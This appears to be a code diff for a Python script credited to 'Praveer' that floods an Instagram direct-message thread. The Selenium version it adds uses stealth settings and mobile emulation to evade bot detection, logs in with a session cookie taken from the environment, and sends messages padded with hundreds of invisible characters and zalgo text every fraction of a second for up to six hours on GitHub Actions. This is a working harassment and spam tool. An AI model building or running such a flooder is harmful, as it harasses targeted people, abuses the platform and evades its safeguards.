@@ -1,84 +1,155 @@
 # -*- coding: utf-8 -*-
-# 🚀 PROJECT: PRAVEER NC (VISIBILITY FIX)
-# 📅 STATUS: FORCED VIEWPORT | 2 AGENTS | 200ms
+# 🚀 PROJECT: PRAVEER NC (V100 HYPER-SPEED)
+# 📅 STATUS: SELENIUM STEALTH | 2 THREADS | 120s RESTART
 
-import os, sys, asyncio, json, time, random
-from playwright.async_api import async_playwright
+import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
+from concurrent.futures import ThreadPoolExecutor
 
-SID = os.getenv("SESSION_ID")
-URL = os.getenv("GROUP_URL")
-TARGET = os.getenv("TARGET_NAME", "Target")
-CREDITS = "SCRIPT BY PRAVEER"
+# 📦 SELENIUM + STEALTH
+from selenium import webdriver
+from selenium_stealth import stealth
+from selenium.webdriver.common.by import By
+from selenium.webdriver.common.keys import Keys
+from selenium.webdriver.chrome.options import Options
 
-total_sent = 0
-counter_lock = asyncio.Lock()
+# --- CONFIGURATION (V100 LOGIC) ---
+THREADS = 2             # Double Agent
+TOTAL_DURATION = 21600  # 6 Hours (Max GH Action time)
+BURST_SPEED = (0.1, 0.3) 
+SESSION_LIMIT = 120     # 2 Minutes Restart
 
-def get_random_payload(target):
-    bloat_chars = ["‎", "‏", "‌", "‍"]
-    bloat = "".join(random.choice(bloat_chars) for _ in range(random.randint(300, 600)))
-    zalgo = "p̸r̸a̸v̸e̸e̸r̸" * random.randint(5, 10)
-    return f"({target}) {bloat}\n{zalgo}\n" + "🛑" * random.randint(5, 10)
+GLOBAL_SENT = 0
+COUNTER_LOCK = threading.Lock()
+BROWSER_LAUNCH_LOCK = threading.Lock()
 
-async def worker(context, agent_id, stop_event):
-    global total_sent
-    page = await context.new_page()
+# Force UTF-8 for GH Logs
+sys.stdout.reconfigure(encoding='utf-8')
+
+def log_status(agent_id, msg):
+    timestamp = datetime.datetime.now().strftime("%H:%M:%S")
+    print(f"[{timestamp}] Agent {agent_id}: {msg}", flush=True)
+
+def get_driver(agent_id):
+    with BROWSER_LAUNCH_LOCK:
+        time.sleep(2) 
+        chrome_options = Options()
+        chrome_options.add_argument("--headless=new") 
+        chrome_options.add_argument("--no-sandbox") 
+        chrome_options.add_argument("--disable-dev-shm-usage")
+        chrome_options.add_argument("--disable-gpu")
+        
+        # iPhone X Mobile Emulation
+        mobile_emulation = {
+            "deviceMetrics": { "width": 375, "height": 812, "pixelRatio": 3.0 },
+            "userAgent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
+        }
+        chrome_options.add_experimental_option("mobileEmulation", mobile_emulation)
+        
+        temp_dir = os.path.join(tempfile.gettempdir(), f"v100_gh_{agent_id}_{int(time.time())}")
+        chrome_options.add_argument(f"--user-data-dir={temp_dir}")
+
+        driver = webdriver.Chrome(options=chrome_options)
+        stealth(driver,
+            languages=["en-US", "en"],
+            vendor="Google Inc.",
+            platform="Linux armv8l", 
+            webgl_vendor="ARM",
+            renderer="Mali-G76",
+            fix_hairline=True,
+        )
+        driver.custom_temp_path = temp_dir
+        return driver
+
+def find_mobile_box(driver):
+    selectors = ["//textarea", "//div[@role='textbox']"]
+    for xpath in selectors:
+        try: 
+            el = driver.find_element(By.XPATH, xpath)
+            if el.is_displayed(): return el
+        except: continue
+    return None
+
+def adaptive_inject(driver, element, text):
     try:
-        print(f"Agent {agent_id} | 🚀 Connecting...")
-        # Navigation with wider timeout for GH Runners
-        await page.goto(URL, wait_until='networkidle', timeout=90000)
+        driver.execute_script("arguments[0].click();", element)
+        driver.execute_script("""
+            var el = arguments[0];
+            document.execCommand('insertText', false, arguments[1]);
+            el.dispatchEvent(new Event('input', { bubbles: true }));
+        """, element, text)
+        time.sleep(0.1)
+        element.send_keys(Keys.ENTER)
+        return True
+    except:
+        return False
+
+# THE GLITCH PAYLOAD GENERATOR
+def get_glitch_payload(target):
+    bloat = "".join(random.choice(["‎", "‏", "‌", "‍"]) for _ in range(random.randint(400, 700)))
+    zalgo = "p̸r̸a̸v̸e̸e̸r̸" * random.randint(5, 12)
+    return f"({target}) {bloat}\n{zalgo}\n🛑"
+
+def run_life_cycle(agent_id, cookie, target):
+    global GLOBAL_SENT
+    start_time = time.time()
+
+    while (time.time() - start_time) < TOTAL_DURATION:
+        driver = None
+        temp_path = None
+        session_start = time.time()
         
-        # FIX: Selector targeting more specific class to find the hidden box
-        msg_input = page.locator('div[role="textbox"][aria-label="Message"]')
+        try:
+            log_status(agent_id, "🚀 Launching Stealth Browser...")
+            driver = get_driver(agent_id)
+            temp_path = getattr(driver, 'custom_temp_path', None)
+            
+            driver.get("https://www.instagram.com/")
+            driver.add_cookie({'name': 'sessionid', 'value': cookie, 'path': '/', 'domain': '.instagram.com'})
+            driver.refresh()
+            time.sleep(5)
+            
+            driver.get(f"https://www.instagram.com/direct/t/{target}/")
+            time.sleep(5)
+            
+            msg_box = find_mobile_box(driver)
+            if not msg_box:
+                log_status(agent_id, "❌ Box Not Found. Refreshing...")
+                continue
+
+            # 2 MINUTE SESSION LOOP
+            while (time.time() - session_start) < SESSION_LIMIT:
+                payload = get_glitch_payload(os.getenv("TARGET_NAME", "User"))
+                
+                if adaptive_inject(driver, msg_box, payload):
+                    with COUNTER_LOCK:
+                        GLOBAL_SENT += 1
+                    if GLOBAL_SENT % 10 == 0:
+                        log_status(agent_id, f"⚡ Sent: {GLOBAL_SENT} | SCRIPT BY PRAVEER")
+                
+                time.sleep(random.uniform(*BURST_SPEED))
+
+        except Exception as e:
+            log_status(agent_id, f"⚠️ Error: {str(e)[:50]}")
         
-        # Wait for existence, then force it to be visible
-        await msg_input.wait_for(state="attached", timeout=45000)
-        
-        # Some GH runners need a scroll to "see" the element
-        await msg_input.scroll_into_view_if_needed()
+        finally:
+            log_status(agent_id, "♻️ 2 Minute Limit - Cleaning RAM...")
+            if driver: driver.quit()
+            if temp_path and os.path.exists(temp_path):
+                shutil.rmtree(temp_path, ignore_errors=True)
+            gc.collect()
+            time.sleep(2)
 
-        while not stop_event.is_set():
-            payload = get_random_payload(TARGET)
-            
-            # Using fill instead of innerText for better hidden-element handling
-            await msg_input.fill(payload)
-            await page.keyboard.press("Enter")
-            
-            async with counter_lock:
-                total_sent += 1
-                print(f"[{total_sent}] Agent {agent_id} Sent | {CREDITS}")
-            
-            await asyncio.sleep(0.2)
-            
-    except Exception as e:
-        print(f"Agent {agent_id} Exception: {str(e)[:100]}")
+def main():
+    cookie = os.environ.get("SESSION_ID", "").strip()
+    target = os.environ.get("GROUP_URL", "").split('/')[-2] # Extracts ID from URL
+    
+    if not cookie or not target:
+        print("❌ MISSING SECRETS (SESSION_ID or GROUP_URL)")
+        return
 
-async def main():
-    if not SID or not URL: return
-
-    while True:
-        async with async_playwright() as p:
-            browser = await p.chromium.launch(headless=True, args=['--no-sandbox'])
-            
-            # FIX: Forced Viewport Size (1920x1080) to stop Instagram from hiding the chat box
-            context = await browser.new_context(
-                viewport={'width': 1920, 'height': 1080},
-                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-            )
-            
-            await context.add_cookies([{"name": "sessionid", "value": SID, "domain": ".instagram.com", "path": "/", "secure": True}])
-
-            stop_event = asyncio.Event()
-            tasks = [asyncio.create_task(worker(context, 1, stop_event)),
-                     asyncio.create_task(worker(context, 2, stop_event))]
-
-            print(f"\n♻️ SESSION START | Viewport: 1080p | Target: {TARGET}")
-            await asyncio.sleep(120) 
-            
-            print(f"\n🕒 RELOAD | TOTAL: {total_sent}")
-            stop_event.set()
-            await asyncio.gather(*tasks, return_exceptions=True)
-            await browser.close()
-            await asyncio.sleep(2)
+    with ThreadPoolExecutor(max_workers=THREADS) as executor:
+        for i in range(THREADS):
+            executor.submit(run_life_cycle, i+1, cookie, target)
 
 if __name__ == "__main__":
-    asyncio.run(main())
+    main()
